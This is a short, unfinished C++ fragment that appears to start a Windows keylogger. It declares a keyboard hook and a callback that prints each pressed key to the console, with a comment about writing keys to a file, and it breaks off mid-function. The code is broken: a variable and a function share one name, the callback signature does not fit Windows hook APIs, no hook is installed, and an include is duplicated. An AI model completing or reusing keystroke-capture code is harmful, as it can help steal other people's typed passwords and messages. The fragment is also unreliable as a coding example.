```cpp
#include <windows.h>
#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;

HHOOK keyboardHook = NULL;

void keyboardHook(HWND hwnd, int wEvent, UINT uParam, int id, UINT wKey, DWORD dwExtraInfo) {
    if (wEvent == WM_KEYDOWN) {
        cout << "Key pressed: " << static_cast<char>(wKey) << endl;
        // Optional: Write to file
